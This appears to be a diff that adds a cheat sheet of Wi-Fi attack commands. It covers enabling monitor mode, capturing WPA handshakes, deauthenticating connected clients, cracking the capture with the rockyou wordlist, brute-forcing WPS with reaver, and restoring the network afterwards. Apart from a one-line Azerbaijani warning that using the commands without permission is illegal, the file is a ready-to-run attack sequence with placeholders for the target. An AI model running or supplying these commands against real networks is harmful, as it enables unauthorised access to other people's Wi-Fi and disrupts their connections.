@@ -1,0 +1,23 @@
+iwconfig
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+sudo airodump-ng wlan0
+sudo airodump-ng --bssid <BSSID> -c <Channel> -w handshake  wlan0
+
+sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
+sudo aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt
+
+reaver -i wlan0 -b [BSSID] -c [Channel] -vv
+
+sudo airmon-ng stop wlan0
+sudo systemctl start NetworkManager
+sudo service NetworkManager restart
+sudo ip link set wlan0 down        
+sudo iw dev wlan0 set type managed                         
+sudo ip link set wlan0 up
+sudo systemctl restart NetworkManager
+
+Diqqet: Bu kodlari icazeniz olmayan wifi modeminde isletmek qanun pozuntusudur...!!!
+                                                                                                                                                            
+  
